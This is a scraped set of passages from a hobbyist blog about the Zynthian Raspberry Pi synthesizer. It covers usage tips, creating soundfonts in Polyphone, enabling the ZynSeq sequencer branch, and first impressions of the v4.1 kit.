need to be aware of tho. First up, make sure you have the correct input channel selected, or nothing will be imported. Also, be aware that if the midi is longer than the length of the pattern, subsequent patterns may be overwritten.\nA gain layer as the final effect on every instrument gives you a quick and easy way to fine tune mixes. This is especially handy, as effects often have their own volume controls, and as instrument controls aren\'t laid out in any kind of consistent way, with the primary volume control for an instrument often buried deep in the page list. If I remember correctly, it\'s on page #7 of Calf Monosynth\'s settings, for example, but it will be some time before my slow brain manages to map any other setting or instrument.\nSometimes a rotary controller slips onto another menu item after you\'ve clicked down on it. Releasing the select controller now would at best waste your time sending you to the wrong screen, or inadvertently delete an entire instrument, or even delete ALL of your carefully tuned instruments and effects. But if you notice a slip and you\'re quick, there\'s another way. Nudge the controller in the desired direction and then release. If you were quick enough, the desired action will be performed, instead of another, potentially destructive one.\nAn easy way of benchmarking instruments and effects is to SSH into the Zynthian, and run htop. I think this was installed by default, but if not an \'apt install htop\' should sort you out. You can see and sort processes by CPU and memory usage, to help you easily identify greedy effects and instruments.\n\nAnyway, these are the main ones I noticed as I flipped through my notes from the last few days. Hopefully they are useful to someone else too.\nI still haven\'t dug into the Zynthian repositories, but when I get the chance, I will add some more bug reports and feature requests. Certainly a confirmation dialogue before deleting all instruments is essential, getting live input working in the pattern editor would save a couple of steps, and a lot of time, and I\'d love to see some consistency with regards to placement of common instrument controls.\nI\'m loving the Zynthian right now, and the fact it\'s being actively developed means it will only get better. Every device has its idiosyncrasies, but given how robust and considered this device already is, and the enthusiastic community who help develop it, I imagine anything considered a bug will be ironed out before long.\n\n            '] at ['https://www.gr0k.net/blog/zynthin-tips-and-tricks.html']

Nevertheless, I managed to import a sample, create an instrument, and bind the sample to the instrument. Trying to use my newly created SF2 file on my Zynthian however, resulted in silence.\nThankfully I stumbled across this thread on the Zynthian forums, with an outdated but nevertheless detailed and straightforward rundown on using Polyphone to create a soundfont. Although the screenshots no longer resemble the apps current interface, the guide is easy to follow, and explains the necessity of creating a preset for your instrument. Ahah!\nAt first I was a little disappointed in needing to return to my computer at all, but I\'m now considering it a net benefit. I\'ll be building a small library of SF2 files from my own samples that will hopefully become a kind of default palette for any future tracks.\n\n            '] at ['https://www.gr0k.net/blog/creating-soundfonts-in-polyphone.html']

For me, this is only possible because of the Zynthian\'s built in sequencer, ZynSeq.\nThere\'s a comprehensive user guide to ZynSeq, but if you\'re new to Zynthian like I am, you may find yourself confused as to why, if the sequencer works at all, the user guide refers to features you seem to be missing.\nIt isn\'t (yet) mentioned in the manual, but the current stable build of Zynthian OS (2020-09-05 at the time of writing) does not include the latest version of ZynSeq. To use it, you\'re going to need to swap to the ZynSeq branch of Zynthian OS. To do that, you\'ll want to:\n\nLog into webconf\nChoose Software / Repositories from the menu\nChange the zynthian-ui dropdown box to \'feature/zynseq\'\nClick \'Save\'\nChoose Software / Update from the menu\nClick the \'Update Software\' button\nReboot your Zynthian once this process has completed\n\nOnce your Zynthian is back online, long push on the learn/snapshot button. All being well, you should see the sequencer\'s pad screen.\nGive the user guide a once over and have a click around. It doesn\'t take long to get the hang of things, with most operations possible using a touch screen if you haven\'t built a Zynthian kit, or mapped your own controller.\n\n            '] at ['https://www.gr0k.net/blog/zynthians-sequencer-zynseq.html']

EXCEPT DESCRIPTION FOUND: ["\n                Zynthian v4.1 Kit - First Impressions\nI'm fairly new to Zynthian, having played with a custom build (3B+ with a $10 soundcard) before deciding to dive in and buy the official V4.1 kit.\nThe Zynthian team were amazing, responding to my pesky emails, and going above and beyond to make sure that my kit arrived in one piece. (Where I live, even with couriers, it's a miracle when any parcel arrives when or as expected, if it arrives at all!)\nThe kit came together easily, with the instructions on the wiki being clear and easy to follow. I tripped myself up by inadvertently using a nightly build on first boot and ran into some issues, but the stable from September 2020 fixed most issues as soon as I'd realised my error.\nI've already had a bit of a play, and using the official Zynthian kit is an absolute joy compared to the caseless, hacked together, touch-screen only version I was using previously. The official unit is nice and solid when fully assembled, and the rotary controllers quickly became second nature, with lots of convenient shortcuts to help move around the system.\nIf I had one niggle, it would just be my preference for hard MPC style clicky buttons for S1-4 over the gel buttons in the kit, but having these buttons at all is a huge improvement over what I've seen of previous generations, and my guess is that hard buttons would either add significantly to the cost, or the delicacy of the LCD screen prevents this style of button. This is a preference anyway, and is at most a minor detail.\nWhile I'm at it, here's a couple of tips for beginners like myself:\n\nI found it really useful to print the manual. I know I might have saved some trees by using a phone or a tablet, but I found myself referring to it to double check build instructions, and continue to refer to the user manual as I get to know the Zynthian. And anyway, I printed two to a page, and purchased this little box to spend less time on a 'computer' - I don't want to get distracted by messages and notifications.\nIt says in the UI Users Guide wiki that a long press on the back button will PANIC! All Notes Off. This is no longer the case, with the recommendation being to map this function to S1-4. If you haven't built your own Zynthian kit, or mapped a controller, the PANIC function is available in the layers page.\n\nThere's so much to love about Zynthian! Not only is it an amazing piece of gear, but the Zynthian team are friendly, helpful, and responsive. No regrets on splashing out, even tho it was for me quite a lot a money.\nI hope to use this blog to document my journey, as I was surprised by the lack of Zynthian related material whilst I was researching before buying.\nThis is a ridiculously flexible and capable machine, and it's already making me rethink my workflows. I'm once again enjoying something that had become fairly tedious and unproductive.\nThe software itself is freely available, and easy to install and use on any recent Raspberry Pi. If you're into music and have one lying around I highly recommend spending an afternoon playing around.\n\n            "] at ['https://www.gr0k.net/blog/zynthian-first-impressions.html']
